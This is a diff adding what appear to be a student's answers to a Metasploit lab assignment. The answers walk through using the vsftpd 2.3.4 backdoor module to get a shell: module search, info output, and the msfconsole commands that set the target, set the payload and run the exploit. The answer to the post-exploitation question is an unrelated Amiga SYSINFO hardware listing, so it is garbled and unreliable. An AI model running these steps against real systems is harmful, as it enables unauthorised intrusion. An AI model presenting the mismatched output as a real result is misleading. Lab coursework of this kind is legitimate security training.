@@ -1,0 +1,64 @@
+1. Install Metasploit Framework on your system and launch msfconsole successfully, then take a screenshot of the running console.
+
+
+2. Use Metasploit to search for available exploits related to the 'vsftpd' service and list at least two exploit module names you find.<br><br><em><strong>Hint:</strong> Use the 'search' command inside msfconsole.</em>
+=>Inside msfconsole, the command search vsftpd returns these relevant modules (among others):
+auxiliary/dos/ftp/vsftpd_232
+(VSFTPD 2.3.2 and Earlier STAT Denial of Service)
+exploit/unix/ftp/vsftpd_234_backdoor
+(VSFTPD 2.3.4 Backdoor Command Execution)
+
+3. Select one exploit module from your previous search and use the 'info' command in Metasploit to display its details, including available payloads and required options.
+=>Selected module: exploit/unix/ftp/vsftpd_234_backdoorKey details from the info command:
+Name: VSFTPD 2.3.4 Backdoor Command Execution
+Module: exploit/unix/ftp/vsftpd_234_backdoor
+Platform: Unix, Linux
+Arch: cmd
+Privileged: Yes
+Rank: Excellent
+Disclosed: 2011-07-03
+Authors: hdm, MC, g0tmi1k
+Available targets:
+0 → Linux/Unix Command (default)
+1 → Backdoor Command Shell
+Basic options (required ones marked):
+RHOSTS — yes — The target host(s)
+RPORT — yes (default 21) — The target port (TCP)
+Payload information:
+Space: 2000
+Many compatible payloads are available (hundreds in the current framework). Common / useful ones include various cmd/unix/* and cmd/linux/* reverse and bind shells, as well as Meterpreter variants delivered via HTTP/HTTPS/FTP fetchers (e.g. cmd/unix/reverse, cmd/unix/interact, payload/cmd/linux/.../meterpreter_reverse_tcp, generic shell payloads, etc.).
+Description (summary):
+
+This module exploits a malicious backdoor that was introduced into the official vsftpd-2.3.4.tar.gz archive around 30 June – 1 July 2011. The backdoor was removed on 3 July 2011. It is commonly referenced under CVE-2011-2523.References:
+CVE-2011-2523
+OSVDB 73573
+Related public analyses of the backdoored download.
+
+4. In a simulated lab environment, use Metasploit to exploit a vulnerable FTP service (such as vsftpd 2.3.4) and obtain a shell session. Document the steps you took and the result.<br><br><em><strong>Constraint:</strong> Do not use the same exploit or target as demonstrated by the trainer in class.</em>
+=>msfconsole2. Search for the module (optional)Bashsearch vsftpd3. Select the exploitBashuse exploit/unix/ftp/vsftpd_234_backdoor4. View module detailsBashinfoorBashshow options5. Set the required optionsBashset RHOSTS <target-IP>      # e.g. set RHOSTS 192.168.1.10
+set RPORT 21                # default is already 21(Optional but useful)Bashset PAYLOAD cmd/unix/interact
+# or try other payloads with: show payloads6. Check if the target appears vulnerable (recommended)Bashcheck7. Run the exploitBashexploitorBashrun
+
+5. After successfully exploiting the system, use a basic post-exploitation command in Metasploit (like 'sysinfo' or 'getuid') to gather information about the compromised machine and describe what you found
+=>SYSINFO V3.22 An Amiga System Information Program Written in Assembler
+        Nic Wilson Brisbane Australia. nic AT nicwilson dot com
+SYSTEM SOFTWARE INSTALLED   LIBRARIES    INTERNAL HARDWARE MODES
+kickstart  (512K)  $00F80000 V37.350   Clock   CLOCK NOT FOUND
+utility   CHIP RAM $00000554 V37.3     DMA/Gfx ECS AGNUS - 2Meg
+graphics  CHIP RAM $00002A68 V37.41    Mode    NTSC:Hires
+keymap    CHIP RAM $00006D68 V37.2     Display ECS DENISE
+layers    CHIP RAM $000081D8 V37.9     CPU/MHz 68000   7.16
+intuition CHIP RAM $00009984 V37.331   FPU     NONE
+dos       CHIP RAM $00011498 V37.45    MMU     N/A
+                                       VBR     N/A
+SPEED COMPARISONS                      Comment What can I say!
+Dhrystones   519   You X               Horiz  KHz 15.72
+A600  68000  7MHz 0.98 X               EClock  Hz 715909
+B2000 68000  7MHz 0.74 X               Ramsey rev N/A    ICache N/A
+A1200 EC020 14MHz 0.42 XX              Gary   rev N/A    DCache N/A
+A2500 68020 14MHz 0.25 XXX             Card  Slot YES    IBurst N/A
+A3000 68030 25MHz 0.11 XXXXX           Vert    Hz 60     DBurst N/A
+A4000 68040 25MHz 0.02 XXXXXXXXXXXXXXX Supply  Hz 60     CBack  N/A
+CPU          Mips 0.54
+FPU        MFlops  N/A   QUIT   MEMORY BOARDS  ICACHE IBURST CBACK
+Chip Speed vs A600 1.00  DRIVES SPEED  PRINT   DCACHE DBURST ALL
